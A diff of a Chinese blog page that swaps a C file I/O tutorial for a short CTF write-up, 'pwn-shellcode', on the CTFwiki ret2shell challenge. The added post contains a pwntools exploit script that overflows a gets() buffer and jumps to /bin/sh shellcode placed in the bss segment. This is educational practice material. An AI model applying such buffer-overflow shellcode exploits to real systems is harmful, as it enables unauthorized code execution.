@@ -24,21 +24,25 @@
     var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
-  <meta name="description" content="C语言文件读写C语言学习笔记1.7使用c语言可以创建，打开，读写文本文件或二进制文件。一个文件，无论它是文本文件还是二进制文件，都是代表了一系列的字节。  语言不仅提供了访问顶层的函数，也提供了底层（OS）调用来处理存储设备上的文件。">
+  <meta name="description" content="pwn-shellcode题目来自 **CTFwiki 基本ROP **">
 <meta property="og:type" content="article">
-<meta property="og:title" content="C语言文件读写">
-<meta property="og:url" content="https://mark0519.github.io/2020/11/12/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/index.html">
+<meta property="og:title" content="pwn-shellcode">
+<meta property="og:url" content="https://mark0519.github.io/2021/01/15/pwn-shellcode/index.html">
 <meta property="og:site_name" content="mark0519的博客">
-<meta property="og:description" content="C语言文件读写C语言学习笔记1.7使用c语言可以创建，打开，读写文本文件或二进制文件。一个文件，无论它是文本文件还是二进制文件，都是代表了一系列的字节。  语言不仅提供了访问顶层的函数，也提供了底层（OS）调用来处理存储设备上的文件。">
+<meta property="og:description" content="pwn-shellcode题目来自 **CTFwiki 基本ROP **">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-11-12T06:10:46.000Z">
-<meta property="article:modified_time" content="2020-11-18T15:47:52.249Z">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/0f68a93d68d1e7198d76afa130e6e7a791adc2ac.png">
+<meta property="article:published_time" content="2021-01-15T09:33:27.000Z">
+<meta property="article:modified_time" content="2021-01-15T09:58:50.180Z">
 <meta property="article:author" content="mark0519">
-<meta property="article:tag" content="c">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/0f68a93d68d1e7198d76afa130e6e7a791adc2ac.png">
 
 
-<link rel="canonical" href="https://mark0519.github.io/2020/11/12/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/">
+<link rel="canonical" href="https://mark0519.github.io/2021/01/15/pwn-shellcode/">
 
 
 <script class="page-configurations">
@@ -51,7 +55,7 @@
   };
 </script>
 
-  <title>C语言文件读写 | mark0519的博客</title>
+  <title>pwn-shellcode | mark0519的博客</title>
   
 
 
@@ -179,7 +183,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="nav-number">1.</span> <span class="nav-text">C语言文件读写</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-7"><span class="nav-number">1.1.</span> <span class="nav-text">C语言学习笔记1.7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.1.</span> <span class="nav-text">打开文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%97%AD%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.2.</span> <span class="nav-text">关闭文件</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-shellcode"><span class="nav-number">1.</span> <span class="nav-text">pwn-shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -248,7 +252,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2020/11/12/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/01/15/pwn-shellcode/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -261,7 +265,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          C语言文件读写
+          pwn-shellcode
         </h1>
 
         <div class="post-meta-container">
@@ -271,16 +275,10 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2020-11-12 14:10:46" itemprop="dateCreated datePublished" datetime="2020-11-12T14:10:46+08:00">2020-11-12</time>
+      <time title="创建时间：2021-01-15 17:33:27 / 修改时间：17:58:50" itemprop="dateCreated datePublished" datetime="2021-01-15T17:33:27+08:00">2021-01-15</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-11-18 23:47:52" itemprop="dateModified" datetime="2020-11-18T23:47:52+08:00">2020-11-18</time>
-      </span>
 
   
 </div>
@@ -292,83 +290,14 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="C语言文件读写"><a href="#C语言文件读写" class="headerlink" title="C语言文件读写"></a>C语言文件读写</h1><h2 id="C语言学习笔记1-7"><a href="#C语言学习笔记1-7" class="headerlink" title="C语言学习笔记1.7"></a>C语言学习笔记1.7</h2><p>使用c语言可以创建，打开，读写文本文件或二进制文件。一个文件，无论它是文本文件还是二进制文件，都是代表了一系列的字节。</p>
-<p> 语言不仅提供了访问顶层的函数，也提供了底层（OS）调用来处理存储设备上的文件。</p>
+        <h1 id="pwn-shellcode"><a href="#pwn-shellcode" class="headerlink" title="pwn-shellcode"></a>pwn-shellcode</h1><p>题目来自 **CTFwiki 基本ROP **</p>
 <a id="more"></a>
 
-<h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><p>可以使用 <strong>fopen( )</strong> 函数来创建一个新的文件或者打开一个已有的文件，这个调用会初始化类型 <strong>FILE</strong> 的一个对象，类型 <strong>FILE</strong> 包含了所有用来控制流的必要的信息。下面是这个函数调用的原型：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> * filename, <span class="keyword">const</span> <span class="keyword">char</span> * mode )</span></span>;</span><br></pre></td></tr></table></figure>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/0f68a93d68d1e7198d76afa130e6e7a791adc2ac.png"></p>
+<p>gets函数和strncpy函数存在漏洞</p>
+<p>溢出s使返回地址为bss段的buf2，在往buf2中添加shellcode即可</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;ip&quot;,&quot;port&quot;)</span></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2shell&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())    <span class="comment">#利用pwntools的shellcraft板块生成shellcode</span></span><br><span class="line"></span><br><span class="line">buf2_adr=<span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;time !!!&quot;</span>)</span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>,<span class="string">&#x27;a&#x27;</span>)+p32(buf2_adr))  <span class="comment">#.ljust(n,&#x27;a&#x27;)将不足n个字符的部分用‘a’填充</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>在这里，<strong>filename</strong> 是字符串，用来命名文件，访问模式 <strong>mode</strong> 的值可以是下列值中的一个：</p>
-<p><strong>访问模式</strong></p>
-<table>
-<thead>
-<tr>
-<th>模式</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>r</td>
-<td>打开一个<strong>已有的</strong>文本文件，<strong>只允许</strong>读取文件，文件必须存在，否则打开失败。</td>
-</tr>
-<tr>
-<td>w</td>
-<td>打开一个文本文件，若不存在则创建一个新文件，程序会从<strong>文件开头</strong>开始写入，若已存在内容，则清空文件内容，重新写入</td>
-</tr>
-<tr>
-<td>a</td>
-<td>打开一个文本文件，若不存在则创建一个新文件，程序以<strong>追加形式的继续写入</strong>。</td>
-</tr>
-<tr>
-<td>r+</td>
-<td>打开一个<strong>已有的</strong>文本文件，<strong>读写</strong>文件内容，文件必须存在，否则打开失败。</td>
-</tr>
-<tr>
-<td>w+</td>
-<td>以<strong>写入/更新</strong>方式打开文件，相当于<code>w</code>和<code>r+</code>叠加的效果。既可以读取也可以写入，也就是随意更新文件。如果文件不存在，那么创建一个新文件；如果文件存在，那么清空文件内容（相当于删除原文件，再创建一个新文件）。</td>
-</tr>
-<tr>
-<td>a+</td>
-<td>以<strong>追加/更新</strong>方式打开文件，相当于<code>a</code>和<code>r+</code>叠加的效果。既可以读取也可以写入，也就是随意更新文件。如果文件不存在，那么创建一个新文件；如果文件存在，那么将写入的数据追加到文件的末尾（文件原有的内容保留）。</td>
-</tr>
-</tbody></table>
-<p><strong>读写权限</strong></p>
-<table>
-<thead>
-<tr>
-<th>权限</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>t</td>
-<td>文本文件，不写默认为“t”</td>
-</tr>
-<tr>
-<td>b</td>
-<td>二进制文件</td>
-</tr>
-</tbody></table>
-<p>调用 fopen() 函数时必须指明读写权限，但是可以不指明读写方式（此时默认为<code>&quot;t&quot;</code>）。</p>
-<p>读写权限和读写方式可以组合使用，但是必须将读写方式放在读写权限的中间或者尾部（<strong>换句话说，不能将读写方式放在读写权限的开头</strong>）。例如：</p>
-<ul>
-<li>将读写方式放在读写权限的末尾：”rb”、”wt”、”ab”、”r+b”、”w+t”、”a+t”</li>
-<li>将读写方式放在读写权限的中间：”rb+”、”wt+”、”ab+”</li>
-</ul>
-<p>整体来说，文件打开方式由 r、w、a、t、b、+ 六个字符拼成，各字符的含义是：</p>
-<ul>
-<li>r(read)：读</li>
-<li>w(write)：写</li>
-<li>a(append)：追加</li>
-<li>t(text)：文本文件</li>
-<li>b(binary)：二进制文件</li>
-<li>+：读和写</li>
-</ul>
-<h3 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h3><p>为了关闭文件，请使用 fclose( ) 函数。函数的原型如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">( FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>如果成功关闭文件，<strong>fclose( )</strong> 函数返回零，如果关闭文件时发生错误，函数返回 <strong>EOF</strong>。</p>
 
     </div>
 
@@ -386,7 +315,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://mark0519.github.io/2020/11/12/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" title="C语言文件读写">https://mark0519.github.io/2020/11/12/C语言文件读写/</a>
+      <a href="https://mark0519.github.io/2021/01/15/pwn-shellcode/" title="pwn-shellcode">https://mark0519.github.io/2021/01/15/pwn-shellcode/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -395,21 +324,20 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/c/" rel="tag"># c</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2020/11/12/c%E8%AF%AD%E8%A8%80gets-getchar-puts-putchar/" rel="prev" title="c语言gets/getchar&puts/putchar">
-                  <i class="fa fa-chevron-left"></i> c语言gets/getchar&puts/putchar
+                <a href="/2021/01/13/pwn-%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E%E2%80%9C/" rel="prev" title="pwn-随机数漏洞">
+                  <i class="fa fa-chevron-left"></i> pwn-随机数漏洞
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2020/11/18/my-first-pwn/" rel="next" title="第一道pwn题">
-                  第一道pwn题 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
